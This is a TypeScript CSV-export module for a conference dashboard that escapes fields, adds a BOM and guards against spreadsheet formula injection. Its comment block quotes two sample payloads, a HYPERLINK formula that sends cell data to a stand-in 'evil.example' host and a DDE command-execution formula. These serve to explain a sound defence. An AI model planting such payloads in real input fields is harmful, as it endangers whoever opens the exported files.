/**
 * CSV generation, shared by every export in the dashboard.
 *
 * ── Deliberately NOT `server-only` ──────────────────────────────────────────
 *
 * Every other lib/ module here carries it. This one must not: it is pure string
 * formatting with no Firestore handle, no credential and no secret, and
 * `server-only` throws outside a React Server Component — which would make the
 * formula-injection guard below untestable by Vitest. Given that guard is the
 * thing standing between a hostile registration form and code executing in
 * somebody's Excel, being able to test it wins.
 *
 * `exports.ts`, which actually reads Firestore, keeps `server-only`.
 *
 * Deliberately not a dependency. The whole of RFC 4180 that matters here is
 * "wrap a field in quotes if it contains a comma, a quote or a newline, and
 * double any quote inside it" — about six lines. What a library would not give
 * us is the part below that actually bites.
 *
 * ── ⚠️ Formula injection is the reason this file has a docblock ─────────────
 *
 * A CSV is opened in Excel, and Excel executes any cell beginning `=`, `+`, `-`
 * or `@` as a formula. An attendee who registers as
 *
 *     =HYPERLINK("http://evil.example/"&A1,"Click me")
 *
 * has just written a payload into every export an organizer opens — and the
 * classic form of this, `=cmd|'/c calc'!A1`, runs a program. The attacker needs
 * nothing but a text field on a public registration form, which is exactly what
 * we have.
 *
 * The defence is one character: prefix a tab. Excel and Sheets both stop
 * treating the cell as a formula, and both still display the text correctly.
 * Every field goes through `escape()`, so this cannot be forgotten per-column.
 *
 * ── The BOM ─────────────────────────────────────────────────────────────────
 *
 * Excel on Windows reads a UTF-8 CSV as Latin-1 unless the file opens with a
 * byte-order mark. Without it, every accented name in a European conference's
 * attendee list arrives mangled — and the person who notices is the one
 * printing badges.
 */

/** Cells beginning with any of these are interpreted as formulas by spreadsheets. */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

function escape(value: unknown): string {
  if (value === null || value === undefined) return '';

  let s = String(value);

  // Neutralise the formula before quoting, so the guard is inside the quotes
  // and survives the round trip.
  if (FORMULA_LEAD.test(s)) s = `\t${s}`;

  if (/[",\n\r]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
  return s;
}

export interface Column<T> {
  header: string;
  value: (row: T) => unknown;
}

/**
 * Rows to a CSV string, with a BOM.
 *
 * `\r\n` line endings because RFC 4180 says so and because Excel is the
 * consumer; Numbers and Sheets accept either.
 */
export function toCsv<T>(rows: T[], columns: Column<T>[]): string {
  const head = columns.map((c) => escape(c.header)).join(',');
  const body = rows.map((r) => columns.map((c) => escape(c.value(r))).join(','));
  return `﻿${[head, ...body].join('\r\n')}\r\n`;
}

/**
 * A filename an organizer can find again in six months.
 *
 * `kgc-2027-attendees-2026-08-25.csv` rather than `export.csv` — the fourth
 * copy of `export (3).csv` in a Downloads folder is the reason exports get
 * re-run rather than reused.
 */
export function exportFilename(kind: string, today: Date): string {
  const date = today.toISOString().slice(0, 10);
  return `kgc-2027-${kind}-${date}.csv`;
}

/** A downloadable response. `text/csv` plus a filename Excel will honour. */
export function csvResponse(csv: string, filename: string): Response {
  return new Response(csv, {
    headers: {
      'Content-Type': 'text/csv; charset=utf-8',
      'Content-Disposition': `attachment; filename="${filename}"`,
      // These contain attendee PII. Nothing may cache them — not the browser,
      // not a proxy, not Netlify's edge.
      'Cache-Control': 'no-store, private',
    },
  });
}
